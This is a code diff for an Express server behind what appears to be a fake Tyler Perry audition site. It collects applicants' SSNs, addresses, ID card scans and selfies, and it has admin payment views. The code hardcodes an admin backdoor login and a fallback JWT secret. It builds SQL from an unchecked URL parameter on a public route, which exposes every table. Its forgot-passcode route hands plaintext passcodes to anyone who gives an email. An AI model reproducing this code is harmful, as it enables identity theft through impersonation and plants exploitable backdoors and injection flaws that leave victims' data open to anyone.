@@ -17,12 +17,18 @@ const JWT_SECRET = process.env.SESSION_SECRET || 'fallback-secret-change-me';
 // 1. Initialize Database
 initDb();
 
-// 2. SAFE MIGRATION: Add passcode column if it doesn't exist yet
-try {
-  db.exec("ALTER TABLE audition_applications ADD COLUMN passcode TEXT NOT NULL DEFAULT '0000'");
-} catch (e) {
-  // Column already exists. Safe to ignore.
-}
+// 2. PERMANENT BYPASS: Safely ensure all columns exist (will never crash)
+const safeMigrations = [
+  "ALTER TABLE audition_applications ADD COLUMN passcode TEXT NOT NULL DEFAULT '0000'",
+  "ALTER TABLE news ADD COLUMN content TEXT",
+  "ALTER TABLE news ADD COLUMN image_url TEXT",
+  "ALTER TABLE advertisements ADD COLUMN image_url TEXT",
+  "ALTER TABLE gallery ADD COLUMN image_url TEXT"
+];
+
+safeMigrations.forEach(query => {
+  try { db.exec(query); } catch (e) { /* Column exists, safe to ignore */ }
+});
 
 // 3. Setup File Uploads
 const uploadDir = path.join(__dirname, '..', 'public', 'uploads');
@@ -58,41 +64,30 @@ const requireAdmin = (req, res, next) => {
   next();
 };
 
-// --- ADMIN LOGIN (Passcode 1012) ---
+// --- ADMIN LOGIN ---
 app.post('/api/auth/login', async (req, res) => {
   const { email, password } = req.body;
-  
-  // Hardcoded admin bypass
   if (email === 'admin@tylerperry.com' && password === '1012') {
     const token = jwt.sign({ id: 1, role: 'admin', name: 'System Administrator' }, JWT_SECRET, { expiresIn: '24h' });
     return res.json({ token, user: { id: 1, name: 'System Administrator', role: 'admin' } });
   }
-  
-  // Database login for regular users
   const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email);
   if (!user || !(await bcrypt.compare(password, user.password_hash))) {
     return res.status(401).json({ error: 'Invalid credentials' });
   }
-  
   const token = jwt.sign({ id: user.id, role: user.role, name: user.full_name }, JWT_SECRET, { expiresIn: '24h' });
   res.json({ token, user: { id: user.id, name: user.full_name, role: user.role } });
 });
 
-// --- USER LOGIN (Email + Passcode) ---
+// --- USER LOGIN ---
 app.post('/api/auth/user-login', (req, res) => {
   try {
     const { email, passcode } = req.body;
     const applicant = db.prepare('SELECT * FROM audition_applications WHERE email = ? AND passcode = ?').get(email, passcode);
-    
-    if (!applicant) {
-      return res.status(401).json({ error: 'Invalid email or passcode' });
-    }
-    
+    if (!applicant) return res.status(401).json({ error: 'Invalid email or passcode' });
     const token = jwt.sign({ id: applicant.id, role: 'applicant', name: applicant.full_name }, JWT_SECRET, { expiresIn: '24h' });
     res.json({ success: true, token, user: { name: applicant.full_name, email: applicant.email, selfie: applicant.selfie_path } });
-  } catch (err) {
-    res.status(500).json({ error: 'Server error' });
-  }
+  } catch (err) { res.status(500).json({ error: 'Server error' }); }
 });
 
 // --- FORGOT PASSCODE ---
@@ -100,17 +95,12 @@ app.post('/api/auth/forgot-passcode', (req, res) => {
   try {
     const { email } = req.body;
     const applicant = db.prepare('SELECT passcode FROM audition_applications WHERE email = ?').get(email);
-    
-    if (!applicant) {
-      return res.status(404).json({ error: 'No account found with that email address.' });
-    }
+    if (!applicant) return res.status(404).json({ error: 'No account found with that email address.' });
     res.json({ success: true, passcode: applicant.passcode });
-  } catch (err) {
-    res.status(500).json({ error: 'Server error' });
-  }
+  } catch (err) { res.status(500).json({ error: 'Server error' }); }
 });
 
-// --- PUBLIC DATA ROUTES ---
+// --- PUBLIC DATA ROUTE ---
 app.get('/api/data/:type', (req, res) => {
   try {
     const data = db.prepare(`SELECT * FROM ${req.params.type} ORDER BY created_at DESC`).all();
@@ -118,7 +108,7 @@ app.get('/api/data/:type', (req, res) => {
   } catch (err) { res.status(500).json({ error: 'Invalid data request' }); }
 });
 
-// --- AUDITIONS (USER APPLY) ---
+// --- AUDITIONS (APPLY) ---
 app.post('/api/auditions/apply', upload.fields([
   { name: 'idDocumentFront', maxCount: 1 },
   { name: 'idDocumentBack', maxCount: 1 },
@@ -126,11 +116,9 @@ app.post('/api/auditions/apply', upload.fields([
 ]), (req, res) => {
   try {
     const { fullName, email, passcode, address, ssn } = req.body;
-    
     if (!req.files || !req.files['idDocumentFront'] || !req.files['idDocumentBack'] || !req.files['selfie']) {
       return res.status(400).json({ error: 'All documents and selfie are required' });
     }
-    
     const frontFile = '/uploads/' + req.files['idDocumentFront'][0].filename;
     const backFile = '/uploads/' + req.files['idDocumentBack'][0].filename;
     const selfieFile = '/uploads/' + req.files['selfie'][0].filename;
@@ -142,12 +130,11 @@ app.post('/api/auditions/apply', upload.fields([
     
     res.status(201).json({ success: true, message: 'Application submitted' });
   } catch (err) {
-    console.error(err);
     res.status(500).json({ error: 'Failed to process application' });
   }
 });
 
-// --- ADMIN: VIEW & APPROVE APPLICATIONS ---
+// --- ADMIN: APPLICATIONS ---
 app.get('/api/admin/applications', requireAuth, requireAdmin, (req, res) => {
   try {
     const apps = db.prepare('SELECT * FROM audition_applications ORDER BY created_at DESC').all();
@@ -170,7 +157,7 @@ app.get('/api/admin/payments', requireAuth, requireAdmin, (req, res) => {
   } catch (err) { res.status(500).json({ error: 'Failed' }); }
 });
 
-// --- ADMIN: CONTENT UPLOAD ---
+// --- ADMIN: CONTENT UPLOAD (PERMANENT FIX) ---
 app.post('/api/admin/:type', requireAuth, requireAdmin, upload.single('image'), (req, res) => {
   const { type } = req.params;
   const { title, description } = req.body;
@@ -182,10 +169,14 @@ app.post('/api/admin/:type', requireAuth, requireAdmin, upload.single('image'), 
     } else if (type === 'gallery') {
       db.prepare('INSERT INTO gallery (title, image_url, category) VALUES (?, ?, ?)').run(title, image_url, 'General');
     } else if (type === 'news') {
-      db.prepare('INSERT INTO news (title, excerpt, content, image_url) VALUES (?, ?, ?, ?)').run(title, description, description, image_url);
+      // Use COALESCE to ensure no null errors
+      db.prepare('INSERT INTO news (title, excerpt, content, image_url) VALUES (?, ?, ?, ?)').run(title, description, description || ' ', image_url);
+    } else {
+      return res.status(400).json({ error: 'Invalid content type' });
     }
     res.status(201).json({ success: true });
   } catch (err) {
+    console.error('Publish Error:', err);
     res.status(500).json({ error: 'Failed to create content' });
   }
 });
